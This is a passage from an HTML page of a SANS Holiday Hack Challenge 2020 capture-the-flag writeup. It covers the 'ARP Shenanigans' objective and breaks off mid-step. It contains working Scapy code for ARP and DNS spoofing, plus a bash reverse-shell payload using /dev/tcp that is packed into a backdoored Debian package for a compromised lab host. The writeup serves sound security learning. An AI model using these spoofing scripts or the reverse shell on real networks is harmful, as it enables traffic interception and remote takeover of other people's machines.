@@ -1,0 +1,893 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <meta name="author" content="Joe Ammond (pugpug)">
+      
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.3">
+    
+    
+      
+        <title>ARP Shenanigans - SANS HHC 2020 writeup</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.3b61ea93.min.css">
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+      <link rel="stylesheet" href="../../css/print.css">
+    
+    
+      
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#arp-shenanigans" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="../.." title="SANS HHC 2020 writeup" class="md-header-nav__button md-logo" aria-label="SANS HHC 2020 writeup">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      <div class="md-header-nav__ellipsis">
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            SANS HHC 2020 writeup
+          </span>
+        </div>
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            
+              ARP Shenanigans
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="SANS HHC 2020 writeup" class="md-nav__button md-logo" aria-label="SANS HHC 2020 writeup">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    SANS HHC 2020 writeup
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="http://ammond.org" class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../.." class="md-nav__link">
+      Welcome
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  
+
+
+  
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
+    
+    <label class="md-nav__link" for="nav-3">
+      Objectives
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Objectives" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        <span class="md-nav__icon md-icon"></span>
+        Objectives
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../1/" class="md-nav__link">
+      Uncover Santa's Gift List
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../2/" class="md-nav__link">
+      Investigate S3 Bucket
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../3/" class="md-nav__link">
+      Point-of-Sale Password Recovery
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../4/" class="md-nav__link">
+      Operate the Santavator
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../5/" class="md-nav__link">
+      Open HID Lock
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../6/" class="md-nav__link">
+      Splunk Challenge
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../7/" class="md-nav__link">
+      Solve the Sleigh's CAN-D-BUS Problem
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../8/" class="md-nav__link">
+      Broken Tag Generator
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        ARP Shenanigans
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+    
+    <a href="./" class="md-nav__link md-nav__link--active">
+      ARP Shenanigans
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#objective" class="md-nav__link">
+    Objective
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#alabaster-snowballs-dialog" class="md-nav__link">
+    Alabaster Snowball's dialog:
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hints" class="md-nav__link">
+    Hints
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    Solution
+  </a>
+  
+    <nav class="md-nav" aria-label="Solution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#arp-response" class="md-nav__link">
+    ARP response
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#answer" class="md-nav__link">
+    Answer
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../10/" class="md-nav__link">
+      Defeat Fingerprint Sensor
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../11a/" class="md-nav__link">
+      Naughty/Nice List with Blockchain Investigation Part 1
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../11b/" class="md-nav__link">
+      Naughty/Nice List with Blockchain Investigation Part 2
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" >
+    
+    <label class="md-nav__link" for="nav-4">
+      Fun stuff
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Fun stuff" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        <span class="md-nav__icon md-icon"></span>
+        Fun stuff
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fun/portrait/" class="md-nav__link">
+      Santa's portrait poem
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fun/secret-garden/" class="md-nav__link">
+      The Secret Garden
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fun/nail/" class="md-nav__link">
+      The Nail
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../conclusion/" class="md-nav__link">
+      Conclusion
+    </a>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#objective" class="md-nav__link">
+    Objective
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#alabaster-snowballs-dialog" class="md-nav__link">
+    Alabaster Snowball's dialog:
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hints" class="md-nav__link">
+    Hints
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    Solution
+  </a>
+  
+    <nav class="md-nav" aria-label="Solution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#arp-response" class="md-nav__link">
+    ARP response
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#answer" class="md-nav__link">
+    Answer
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset"><a class="md-content__button md-icon" download href="9.pdf" title="PDF Export"><svg style="height: 1.2rem; width: 1.2rem;" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M224 136V0H24C10.7 0 0 10.7 0 24v464c0 13.3 10.7 24 24 24h336c13.3 0 24-10.7 24-24V160H248c-13.2 0-24-10.8-24-24zm76.45 211.36l-96.42 95.7c-6.65 6.61-17.39 6.61-24.04 0l-96.42-95.7C73.42 337.29 80.54 320 94.82 320H160v-80c0-8.84 7.16-16 16-16h32c8.84 0 16 7.16 16 16v80h65.18c14.28 0 21.4 17.29 11.27 27.36zM377 105L279.1 7c-4.5-4.5-10.6-7-17-7H256v128h128v-6.1c0-6.3-2.5-12.4-7-16.9z"></path></svg></a>
+              
+                
+                
+                <h1 id="arp-shenanigans">ARP Shenanigans<a class="headerlink" href="#arp-shenanigans" title="Permanent link">#</a></h1>
+<h2 id="objective">Objective<a class="headerlink" href="#objective" title="Permanent link">#</a></h2>
+<blockquote>
+<p>Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using <code>ARP</code>. Retrieve the document at <code>/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt</code>. Who recused herself from the vote described on the document?</p>
+</blockquote>
+<p><code>Difficulty: 4/5</code></p>
+<h2 id="alabaster-snowballs-dialog">Alabaster Snowball's dialog:<a class="headerlink" href="#alabaster-snowballs-dialog" title="Permanent link">#</a></h2>
+<blockquote>
+<p>Those skills might be useful to you later on!<br>
+I've been trying those skills out myself on this other terminal.<br>
+I'm pretty sure I can use tcpdump to sniff some packets.<br>
+Then I'm going to try a machine-in-the-middle attack.<br>
+Next, I'll spoof a <code>DNS</code> response to point the host to my terminal.<br>
+Then I want to respond to its <code>HTTP</code> request with something I'll cook up.<br>
+I'm almost there, but I can't quite get it. I could use some help!<br></p>
+<p>Oh, I see the Scapy Present Packet Prepper has already been completed!<br>
+Now you can help me get access to this machine.<br>
+It seems that some interloper here at the North Pole has taken control of the host.<br>
+We need to regain access to some important documents associated with Kringle Castle.<br>
+Maybe we should try a machine-in-the-middle attack?<br>
+That could give us access to manipulate <code>DNS</code> responses.<br>
+But we'll still need to cook up something to change the <code>HTTP</code> response.<br>
+I'm sure glad you're here Santa.<br></p>
+</blockquote>
+<h2 id="hints">Hints<a class="headerlink" href="#hints" title="Permanent link">#</a></h2>
+<blockquote>
+<p>Jack Frost must have gotten malware on our host at <code>10.6.6.35</code> because we can no longer access it. Try sniffing the <code>eth0</code> interface using <code>tcpdump -nni eth0</code> to see if you can view any traffic from that host.<br>
+The host is performing an <code>ARP</code> request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. I think we have some sample scapy traffic scripts that could help you in <code>/home/guest/scripts</code>.<br>
+Hmmm, looks like the host does a <code>DNS</code> request after you successfully do an <code>ARP</code> spoof. Let's return a <code>DNS</code> response resolving the request to our <code>IP</code>.<br>
+The malware on the host does an <code>HTTP</code> request for a <code>.deb</code> package. Maybe we can get command line access by sending it a <a href="http://www.wannescolman.be/?p=98">command in a customized .deb file</a><br></p>
+</blockquote>
+<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">#</a></h2>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Complete the terminal <strong>Scapy Prepper</strong> for hints on how to solve this objective.</p>
+</div>
+<p>From the hints, we find out a host on the Castle's network has been compromised. We also learn
+that there will be a multi-step process to gain access to the host:</p>
+<ul>
+<li>Respond to the ARP request from the compromised host.</li>
+<li>Respond to the DNS request from the compromised host.</li>
+<li>Provide a package file to the compromised host with a backdoor script.</li>
+<li>Gain shell access to the host and retrieve the document.</li>
+</ul>
+<h3 id="arp-response">ARP response<a class="headerlink" href="#arp-response" title="Permanent link">#</a></h3>
+<p>The compromised host is requesting the MAC address of <code>10.6.6.53</code>. We have a template scapy
+script in <code>scripts/arp_resp.py</code>, but some of the fields in the response need to be filled out:</p>
+<div class="highlight"><pre><span></span><code><span class="n">ether_resp</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s2">&quot;SOMEMACHERE&quot;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="mh">0x806</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="s2">&quot;SOMEMACHERE&quot;</span><span class="p">)</span>
+
+<span class="n">arp_response</span> <span class="o">=</span> <span class="n">ARP</span><span class="p">(</span><span class="n">pdst</span><span class="o">=</span><span class="s2">&quot;SOMEMACHERE&quot;</span><span class="p">)</span>
+<span class="n">arp_response</span><span class="o">.</span><span class="n">op</span> <span class="o">=</span> <span class="mi">99999</span>
+<span class="n">arp_response</span><span class="o">.</span><span class="n">plen</span> <span class="o">=</span> <span class="mi">99999</span>
+<span class="n">arp_response</span><span class="o">.</span><span class="n">hwlen</span> <span class="o">=</span> <span class="mi">99999</span>
+<span class="n">arp_response</span><span class="o">.</span><span class="n">ptype</span> <span class="o">=</span> <span class="mi">99999</span>
+<span class="n">arp_response</span><span class="o">.</span><span class="n">hwtype</span> <span class="o">=</span> <span class="mi">99999</span>
+
+<span class="n">arp_response</span><span class="o">.</span><span class="n">hwsrc</span> <span class="o">=</span> <span class="s2">&quot;SOMEVALUEHERE&quot;</span>
+<span class="n">arp_response</span><span class="o">.</span><span class="n">psrc</span> <span class="o">=</span> <span class="s2">&quot;SOMEVALUEHERE&quot;</span>
+<span class="n">arp_response</span><span class="o">.</span><span class="n">hwdst</span> <span class="o">=</span> <span class="s2">&quot;SOMEVALUEHERE&quot;</span>
+<span class="n">arp_response</span><span class="o">.</span><span class="n">pdst</span> <span class="o">=</span> <span class="s2">&quot;SOMEVALUEHERE&quot;</span>
+</code></pre></div>
+<p>We need to respond to the ARP request and tell the compromised host to direct any subsequent
+traffic to us. Using this <a href="https://www.practicalnetworking.net/series/arp/traditional-arp/">guide to ARP packets</a>, we can fill in the appropriate sections in the response packets:</p>
+<div class="highlight"><pre><span></span><code><span class="n">ether_resp</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">Ether</span><span class="p">]</span><span class="o">.</span><span class="n">src</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="mh">0x806</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="n">macaddr</span><span class="p">)</span>
+
+<span class="n">arp_response</span> <span class="o">=</span> <span class="n">ARP</span><span class="p">(</span><span class="n">pdst</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">psrc</span><span class="p">)</span>
+<span class="n">arp_response</span><span class="o">.</span><span class="n">op</span> <span class="o">=</span> <span class="s2">&quot;is-at&quot;</span>
+<span class="n">arp_response</span><span class="o">.</span><span class="n">plen</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">plen</span>
+<span class="n">arp_response</span><span class="o">.</span><span class="n">hwlen</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">hwlen</span>
+<span class="n">arp_response</span><span class="o">.</span><span class="n">ptype</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">ptype</span>
+<span class="n">arp_response</span><span class="o">.</span><span class="n">hwtype</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">hwtype</span>
+
+<span class="n">arp_response</span><span class="o">.</span><span class="n">hwsrc</span> <span class="o">=</span> <span class="n">macaddr</span>
+<span class="n">arp_response</span><span class="o">.</span><span class="n">psrc</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">pdst</span>
+<span class="n">arp_response</span><span class="o">.</span><span class="n">hwdst</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">Ether</span><span class="p">]</span><span class="o">.</span><span class="n">src</span>
+<span class="n">arp_response</span><span class="o">.</span><span class="n">pdst</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">psrc</span>
+</code></pre></div>
+<p>And we were successful:</p>
+<p><img alt="Successful ARP response" src="../../img/9/o9-1.png" /></p>
+<p>We can see the next piece of data we need to spoof: a DNS lookup for <code>ftp.osuosl.org</code>. There's
+a sample script in <code>scripts/dns_resp.py</code>, with some sections we need to change:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># destination ip we arp spoofed</span>
+<span class="n">ipaddr_we_arp_spoofed</span> <span class="o">=</span> <span class="s2">&quot;10.6.1.10&quot;</span>
+
+<span class="k">def</span> <span class="nf">handle_dns_request</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
+    <span class="c1"># Need to change mac addresses, Ip Addresses, and ports below.</span>
+    <span class="c1"># We also need</span>
+    <span class="n">eth</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="s2">&quot;00:00:00:00:00:00&quot;</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="s2">&quot;00:00:00:00:00:00&quot;</span><span class="p">)</span>   <span class="c1"># need to replace mac addresses</span>
+    <span class="n">ip</span>  <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s2">&quot;0.0.0.0&quot;</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="s2">&quot;0.0.0.0&quot;</span><span class="p">)</span>                          <span class="c1"># need to replace IP addresses</span>
+    <span class="n">udp</span> <span class="o">=</span> <span class="n">UDP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="mi">99999</span><span class="p">,</span> <span class="n">sport</span><span class="o">=</span><span class="mi">99999</span><span class="p">)</span>                             <span class="c1"># need to replace ports</span>
+    <span class="n">dns</span> <span class="o">=</span> <span class="n">DNS</span><span class="p">(</span>
+        <span class="c1"># MISSING DNS RESPONSE LAYER VALUES</span>
+    <span class="p">)</span>
+</code></pre></div>
+<p>DNS packets are complex to create, and can be
+tricky to get right. A couple of helpful guides are at
+<a href="https://www2.cs.duke.edu/courses/fall16/compsci356/DNS/DNS-primer.pdf">here</a> and
+<a href="http://lost-and-found-narihiro.blogspot.com/2015/02/python-scapy-send-fake-dns-responses.html">here</a>. With much trial and error, we can build a response packet with the following code:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># destination ip we arp spoofed</span>
+<span class="n">ipaddr_we_arp_spoofed</span> <span class="o">=</span> <span class="s2">&quot;10.6.6.53&quot;</span>
+
+<span class="k">def</span> <span class="nf">handle_dns_request</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
+    <span class="c1"># Need to change mac addresses, Ip Addresses, and ports below.</span>
+    <span class="c1"># We also need</span>
+    <span class="n">eth</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">Ether</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">Ether</span><span class="p">]</span><span class="o">.</span><span class="n">src</span><span class="p">)</span>
+    <span class="n">ip</span>  <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">src</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span><span class="p">)</span>
+    <span class="n">udp</span> <span class="o">=</span> <span class="n">UDP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">UDP</span><span class="p">]</span><span class="o">.</span><span class="n">sport</span><span class="p">,</span> <span class="n">sport</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">UDP</span><span class="p">]</span><span class="o">.</span><span class="n">dport</span><span class="p">)</span>
+    <span class="n">dns</span> <span class="o">=</span> <span class="n">DNS</span><span class="p">(</span>
+            <span class="nb">id</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">id</span><span class="p">,</span>
+            <span class="n">qr</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">ra</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">rd</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">opcode</span><span class="o">=</span><span class="s2">&quot;QUERY&quot;</span><span class="p">,</span> <span class="n">rcode</span><span class="o">=</span><span class="s2">&quot;ok&quot;</span><span class="p">,</span> <span class="n">qdcount</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">ancount</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">qd</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">qd</span><span class="p">,</span>
+            <span class="n">an</span><span class="o">=</span><span class="n">DNSRR</span><span class="p">(</span><span class="n">rrname</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">qd</span><span class="o">.</span><span class="n">qname</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="s1">&#39;A&#39;</span><span class="p">,</span> <span class="n">rclass</span><span class="o">=</span><span class="s1">&#39;IN&#39;</span><span class="p">,</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">82159</span><span class="p">,</span> <span class="n">rdata</span><span class="o">=</span><span class="n">ipaddr</span><span class="p">),</span>
+    <span class="p">)</span>
+</code></pre></div>
+<p>A small shell script helps manage starting the spoof scripts. The DNS spoof script is started first,
+to be ready when the ARP spoof fires:</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/sh</span>
+
+python3 dns_resp.py <span class="p">&amp;</span>
+python3 arp_resp.py <span class="p">&amp;</span>
+</code></pre></div>
+<p>We can see the ARP request &amp; response, then the DNS query and response:</p>
+<p><img alt="ARP &amp; DNS responses" src="../../img/9/o9-2.png" /></p>
+<p>Now we see a new request from the compromised host: an attempted HTTP request, which
+failed as there was no web server listening on port <code>80</code>:</p>
+<p><img alt="HTTP request" src="../../img/9/o9-3.png" /></p>
+<p>We can start one with <code>python3 -m http.server 80</code>, run our shell script again, and
+look at the web server output to see what the compromised host is requesting:</p>
+<p><img alt="HTTP log" src="../../img/9/o9-4.png" /></p>
+<p>The compromised host is requesting a Debian package
+<code>/pub/jfrost/backdoor/suriv_amd64.deb</code>.  We can create a package with a backdoor in it,
+serve it up with the correct path, and receive a remote shell when the compromised host
+installs the package. There are a number of Debian packages in the <code>debs</code> directory
+in the terminal, but I found it easier to use a tool to create an empty package
+with just a reverse shell backdoor instead of modifying one of the provided ones.
+The tool I used is <a href="https://github.com/mthbernardes/Derbie">Derbie</a>. After cloning
+the GitHub repository on your local machine and installing the dependencies, create
+a smiple reverse shell payload script:</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+
+<span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">196</span><span class="p">;</span><span class="nb">exec</span> <span class="m">196</span>&lt;&gt;/dev/tcp/10.6.0.3/10444<span class="p">;</span> sh &lt;<span class="p">&amp;</span><span class="m">196</span> &gt;<span class="p">&amp;</span><span class="m">196</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">196</span>
+</code></pre></div>
+<p>Replace <code>10.6.0.3</code> with the IP address of the host in your terminal.</p>
+<p>Next, generate the package with <code>python3 Derbie.py suriv payload.sh</code>:</p>
+<p><img alt="Malicious package" src="../../img/9/o9-5.png" /></p>
+<p>We now need to get the package from our local machine into the <strong><code>ARP Spoof</code></strong>
+terminal. As the terminal can't reach outside it's network, the best method
+of transferring the package is copy/paste. On the local machine run <code>base64
+debs/suriv_43_all.deb</code>, copy the base64-encoded text, and in the terminal run <code>base64
+-d &gt; suriv_amd64.deb</code>, then paste the text.</p>
+<p>For the <code>HTTP GET</code> request to work, we need to make sure we have the correct path set up.
+Run <code>mkdir -p pub/jfrost/backdoor/</code>, move the package file to that directory, then re-start
